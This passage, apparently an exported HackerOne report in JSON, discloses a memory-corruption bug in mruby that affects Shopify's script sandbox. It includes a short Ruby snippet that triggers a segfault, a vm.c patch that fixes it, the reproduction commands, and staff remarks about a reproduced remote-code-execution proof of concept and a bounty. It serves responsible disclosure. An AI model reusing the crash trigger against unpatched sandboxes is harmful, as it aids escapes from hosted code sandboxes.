+            "message": "We have built mruby with the following commit checked out: \n6420951463ec9ace9eecb50923dc6a1925a45d31\n\nAnd mruby-engine with: 09be20e\n\nWe have tested it on two platforms:\n* Arch Linux (with all packages updated as of 2017-02-09), built with gcc version 6.3.1 20170109 (GCC), glibc-2.24.\n* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 \n(Ubuntu 4.8.4-2ubuntu1~14.04.3), libc 2.19-0ubuntu6.9. Debugger CGDB 0.6.7, \nran with the above POC saved as `payload`:\n\n`cgdb --args mruby/bin/mruby payload`\n\nWe also discovered improvements to the original POC in the meantime. The attached\nPOC works on the sandbox, and it is no longer necessary to search the memory\nfor the value 75; instead we get an appropriate value (33) in a direct manner\nthrough object_id. The updated POC was tested with either:\n\n* `/home/<user>/mruby-engine/bin/sandbox payload-updated`\n*  `cgdb --args ruby /home/<user>/mruby-engine/bin/sandbox payload-updated`", 
+            "markdown_message": "<p>We have built mruby with the following commit checked out: <br>\n6420951463ec9ace9eecb50923dc6a1925a45d31</p>\n\n<p>And mruby-engine with: 09be20e</p>\n\n<p>We have tested it on two platforms:</p>\n\n<ul>\n<li>Arch Linux (with all packages updated as of 2017-02-09), built with gcc version 6.3.1 20170109 (GCC), glibc-2.24.</li>\n<li>Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 \n(Ubuntu 4.8.4-2ubuntu1~14.04.3), libc 2.19-0ubuntu6.9. Debugger CGDB 0.6.7, \nran with the above POC saved as <code>payload</code>:</li>\n</ul>\n\n<p><code>cgdb --args mruby/bin/mruby payload</code></p>\n\n<p>We also discovered improvements to the original POC in the meantime. The attached<br>\nPOC works on the sandbox, and it is no longer necessary to search the memory<br>\nfor the value 75; instead we get an appropriate value (33) in a direct manner<br>\nthrough object_id. The updated POC was tested with either:</p>\n\n<ul>\n<li><code>/home/&lt;user&gt;/mruby-engine/bin/sandbox payload-updated</code></li>\n<li> <code>cgdb --args ruby /home/&lt;user&gt;/mruby-engine/bin/sandbox payload-updated</code>\n</li>\n</ul>\n", 
+            "type": "Activities::Comment", 
+            "id": 1486081, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-15T03:05:05.239Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-15T03:05:05.239Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks for the additional information! I'll let you know once we've reproduced your results.", 
+            "markdown_message": "<p>Thanks for the additional information! I&#39;ll let you know once we&#39;ve reproduced your results.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1486243, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-27T22:24:53.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T22:24:53.122Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Just to follow up, I was able to reproduce your RCE proof of concept, so we'll take that into account when deciding the final bounty amount. Our next round of bounty payouts should be happening before long.", 
+            "markdown_message": "<p>Just to follow up, I was able to reproduce your RCE proof of concept, so we&#39;ll take that into account when deciding the final bounty amount. Our next round of bounty payouts should be happening before long.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1509529, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-02-27T23:33:45.966Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T23:33:45.966Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "2000.0", 
+            "collaborator": {
+                "username": "dgaletic", 
+                "url": "/dgaletic"
+            }, 
+            "message": "Thanks for helping improve the security of Shopify Scripts and the MRuby project!", 
+            "markdown_message": "<p>Thanks for helping improve the security of Shopify Scripts and the MRuby project!</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1509669, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-27T23:33:54.217Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-27T23:33:54.217Z", 
+            "actor": {
+                "username": "andrewdunbar", 
+                "url": "/andrewdunbar", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1509670, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-28T13:30:02.753Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-28T13:30:02.753Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1510922, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-28T13:30:02.799Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-28T13:30:02.799Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1510923, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "dgaletic", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/dgaletic", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 2, 
+        "name": "Memory Corruption - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -53305739.47575524, 
+    "disclosed_at": "2017-02-28T13:30:02.780Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/201897", 
+    "created_at": "2017-01-29T10:18:43.076Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>The following code produces a segfault without causing a stack overflow, affecting the sandbox:</p>\n<pre class=\"highlight plaintext\"><code>def fn(n)\n    return\n    ensure\n        if n == 0\n    else fn(n-1)\n    end\nend\nfn(24)\n</code></pre>\n<p>When the <code>n</code> parameter is less than 24, there is no segfault. However,<br>\ninvestigating with a memory sanitizer shows that uninitialized read errors<br>\nstart to happen when <code>n &gt;= 15</code>. The uninitialized read happens at the following<br>\nlocation in vm.c (with the relevant line marked):</p>\n<pre class=\"highlight plaintext\"><code>1701         cipop(mrb);\n1702         acc = ci-&gt;acc;  [***]\n1703         mrb-&gt;c-&gt;stack = ci-&gt;stackent;\n</code></pre>\n<p>The issue seems to be in using the <code>ci</code> data after the call to <code>cipop</code>. The following patch stops the read errors and segfaults, and passes make test:</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff --git a/src/vm.c b/src/vm.c\nindex 9684dab..66fb692 100644\n</span><span class=\"gd\">--- a/src/vm.c\n</span><span class=\"gi\">+++ b/src/vm.c\n</span><span class=\"gu\">@@ -1698,9 +1698,10 @@ RETRY_TRY_BLOCK:\n</span>           mrb-&gt;jmp = prev_jmp;\n           return v;\n         }\n<span class=\"gd\">-        cipop(mrb);\n</span><span class=\"gi\">+        ci = mrb-&gt;c-&gt;ci;\n</span>         acc = ci-&gt;acc;\n         mrb-&gt;c-&gt;stack = ci-&gt;stackent;\n<span class=\"gi\">+        cipop(mrb);\n</span>         if (acc == CI_ACC_SKIP) {\n           mrb-&gt;jmp = prev_jmp;\n           return v;\n</code></pre>", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.mruby.science", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "shopify-scripts"
+        }, 
+        "handle": "shopify-scripts", 
+        "url": "https://hackerone.com/shopify-scripts", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15668, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
